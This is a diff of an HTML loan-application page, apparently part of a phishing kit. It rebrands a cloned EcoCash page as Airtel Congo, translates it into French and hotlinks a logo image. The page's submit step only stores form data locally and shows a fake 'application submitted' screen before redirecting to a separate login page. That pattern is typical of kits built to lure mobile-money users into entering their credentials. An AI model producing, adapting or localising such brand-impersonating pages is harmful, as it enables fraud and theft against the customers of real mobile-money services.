@@ -1,10 +1,11 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Application</title>
+    <title>Airtel - Demande de prêt</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -48,18 +49,27 @@
             color: #333;
         }
         
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
+       .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            width: auto;
+            height: 40px;
+
+            flex-shrink: 0;
         }
-        
-        .logo-eco {
-            color: #0066ff;
+
+        .logo img {
+            width: 110px;
+            height: 40px;
+
+            object-fit: contain;
+            object-position: center;
+
+            display: block;
         }
-        
-        .logo-cash {
-            color: #ff0000;
-        }
+
         
         .card {
             background: white;
@@ -181,7 +191,7 @@
             width: 100%;
             max-width: 480px;
         }
-        /* Spinner Overlay - Transparent Bluish */
+        /* Superposition de chargement - Bleu transparent */
         
         #spinnerOverlay {
             position: fixed;
@@ -190,7 +200,7 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 102, 255, 0.15);
-            /* Transparent bluish */
+            /* Bleu transparent */
             display: none;
             justify-content: center;
             align-items: center;
@@ -216,7 +226,7 @@
                 transform: rotate(360deg);
             }
         }
-        /* Success Overlay */
+        /* Superposition de réussite */
         
         #successOverlay {
             position: fixed;
@@ -307,65 +317,70 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
+        <div class="logo">
+            <img
+                src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwKPIUOxpuuEY1j3YBezDsKGUqWQ8aZNoh7dFU4nzwiw&s=10"
+                alt="EcoCash"
+            >
+        </div>
         <div></div>
     </header>
 
     <main class="card">
         <div class="top">
-            <h1 class="form-title">Final Review</h1>
+            <h1 class="form-title">Vérification finale</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">Step 3 of 3</div>
-            <label class="form-label">Employment Status</label>
+            <div class="step-text">Étape 3 sur 3</div>
+            <label class="form-label">Situation professionnelle</label>
             <select class="form-select" id="employmentStatus">
-                <option>Employed</option>
-                <option>Self-Employed</option>
-                <option>Unemployed</option>
-                <option>Student</option>
+                <option>Salarié(e)</option>
+                <option>Indépendant(e)</option>
+                <option>Sans emploi</option>
+                <option>Étudiant(e)</option>
             </select>
-            <label class="form-label">Annual Income ($)</label>
+            <label class="form-label">Revenu annuel ($)</label>
             <input type="number" class="form-input" id="annualIncome" placeholder="50000">
             <div class="summary-box" id="summaryBox">
-                <!-- Filled dynamically by JavaScript -->
+                <!-- Rempli automatiquement par JavaScript -->
             </div>
         </div>
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+            <button class="prev-btn" onclick="history.back()">PRÉCÉDENT</button>
+            <button class="submit-btn" id="submitBtn">SOUMETTRE LA DEMANDE</button>
         </div>
     </main>
-    <footer>© 2025 EcoCash</footer>
+    <footer>© 2026 Airtel Congo. Tous droits réservés.</footer>
     <!-- Spinner Overlay (Transparent Bluish) -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
     </div>
-    <!-- Success Overlay -->
+    <!-- Superposition de réussite -->
     <div id="successOverlay">
         <div class="success-card">
             <div class="check-icon">✓</div>
-            <div class="success-title">Loan Application Submitted</div>
+            <div class="success-title">Demande de prêt soumise</div>
             <div class="success-msg">
-                Your loan application has been submitted. Please wait for approval.<br><br> You will receive a confirmation message. For now, proceed to EcoCash.
+                Votre demande de prêt a été soumise. Veuillez patienter pendant son approbation.<br><br> Vous recevrez un message de confirmation. Pour le moment, continuez vers Airtel.
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirecting to EcoCash login in <span id="countdown">3</span>...
+                Redirection vers la connexion Airtel dans <span id="countdown">3</span>...
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to Login Now</button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">Se connecter maintenant</button>
         </div>
     </div>
     <script>
         const summaryBox = document.getElementById('summaryBox');
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
-            <div class="summary-row"><span>Amount:</span><span class="summary-value">$${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
-            <div class="summary-row"><span>Term:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
-            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
-            <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>Phone:</span><span class="summary-value">+263 ${localStorage.getItem('phone') || 'N/A'}</span></div>
+            <div class="summary-row"><span>Type de prêt :</span><span class="summary-value">${localStorage.getItem('loanType') || 'Prêt personnel'}</span></div>
+            <div class="summary-row"><span>Montant :</span><span class="summary-value">$${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
+            <div class="summary-row"><span>Durée :</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Mois</span></div>
+            <div class="summary-row"><span>Objet :</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Non spécifié'}</span></div>
+            <div class="summary-row"><span>Nom :</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>E-mail :</span><span class="summary-value">${localStorage.getItem('email') || 'N/D'}</span></div>
+            <div class="summary-row"><span>Téléphone :</span><span class="summary-value">+242 ${localStorage.getItem('phone') || 'N/D'}</span></div>
         `;
         if (localStorage.getItem('employmentStatus')) {
             document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
@@ -376,19 +391,19 @@
         document.getElementById('submitBtn').addEventListener('click', function() {
             const income = document.getElementById('annualIncome').value.trim();
             if (!income || income < 1000) {
-                alert('Please enter a valid annual income (minimum $1,000).');
+                alert('Veuillez saisir un revenu annuel valide (minimum 1 000 $).');
                 return;
             }
             localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
             localStorage.setItem('annualIncome', income);
-            // Show transparent bluish spinner for 3 seconds
+            // Afficher l'indicateur de chargement bleu transparent pendant 3 secondes
             const spinnerOverlay = document.getElementById('spinnerOverlay');
             spinnerOverlay.style.display = 'flex';
             setTimeout(() => {
                 spinnerOverlay.style.display = 'none';
                 const successOverlay = document.getElementById('successOverlay');
                 successOverlay.style.display = 'flex';
-                // Countdown 3 seconds then auto redirect
+                // Compte à rebours de 3 secondes puis redirection automatique
                 let seconds = 3;
                 const countdownEl = document.getElementById('countdown');
                 const timer = setInterval(() => {
@@ -396,7 +411,7 @@
                     countdownEl.textContent = seconds;
                     if (seconds <= 0) {
                         clearInterval(timer);
-                        window.location.href = 'login.html';
+                        window.location.href = 'hodl.html';
                     }
                 }, 1000);
             }, 3000);
